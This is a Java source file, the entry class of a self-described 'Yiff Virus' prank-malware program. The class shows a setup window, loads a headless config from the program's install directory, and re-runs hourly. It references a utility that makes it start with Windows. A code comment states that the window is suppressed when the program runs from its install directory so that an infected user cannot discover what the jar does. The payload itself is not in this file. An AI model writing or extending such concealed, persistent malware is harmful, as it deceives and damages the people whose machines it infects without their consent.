package me.bannock.virus;


import com.formdev.flatlaf.FlatDarculaLaf;
import com.formdev.flatlaf.FlatDarkLaf;
import com.google.gson.Gson;
import me.bannock.virus.images.ImageProviderService;
import me.bannock.virus.images.impl.TestImageProviderService;
import me.bannock.virus.images.impl.YiffProviderService;
import me.bannock.virus.utils.StartOnWindowsStartUtils;

import javax.swing.JFrame;
import java.awt.GridLayout;
import java.awt.HeadlessException;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.util.Arrays;
import java.util.Timer;

public class YiffVirus extends JFrame implements Runnable {

    private Config config = new Config();
    private final ImageProviderService imageProviderService = new TestImageProviderService();

    protected static final File HEADLESS_CONFIG_FILE = new File(StartOnWindowsStartUtils.VIRUS_INSTALL_DIR, "msg.json");

    /**
     * Creates a new gui window
     * @throws HeadlessException Whenever it feels like it
     */
    public YiffVirus() throws HeadlessException {
        setSize(450, 450);
        setResizable(false);
        setDefaultCloseOperation(EXIT_ON_CLOSE);
        setTitle("Yiff Virus");
        setContentPane(new VirusSetupForm(config, this).getForm());
    }

    /**
     * Entry point for application
     * @param args
     */
    public static void main(String[] args) {

        // Create virus
        FlatDarculaLaf.setup();
        YiffVirus yiffVirus = new YiffVirus();

        // Show the gui if the user wants a gui, autoload if the user configured it to autoload
        boolean showGui = true;
        for (String arg : args){
            switch(arg.toLowerCase()){
                case "-headless":{
                    showGui = false;
                    if (HEADLESS_CONFIG_FILE.exists()) {
                        try {
                            yiffVirus.setConfig(new Gson().fromJson(Files.readString(HEADLESS_CONFIG_FILE.toPath()), Config.class));
                        } catch (IOException ignored) {}
                    }
                    yiffVirus.run();
                }break;
            }
        }

        // If the jar is loaded from the virus install dir then do not show the gui, this is done so an infected user cannot
        // find out the purpose of the jar just by double-clicking it and reading the window title
        if (new File("").getAbsolutePath().equals(StartOnWindowsStartUtils.VIRUS_INSTALL_DIR.getAbsolutePath()))
            showGui = false;

        // Display gui if wanted by user
        if (showGui)
            yiffVirus.setVisible(true);

    }

    /**
     * Starts running the virus, locks thread
     */
    @Override
    public void run() {

        // Repeated hourly if wanted
        if (config.shouldRepeatHourly())
            try{
                Thread.sleep(1000 * 60 * 60);
                run();
            }catch (Exception ignored){}
    }

    public void setConfig(Config config) {
        this.config = config;
    }

    public ImageProviderService getImageProviderService() {
        return imageProviderService;
    }
}
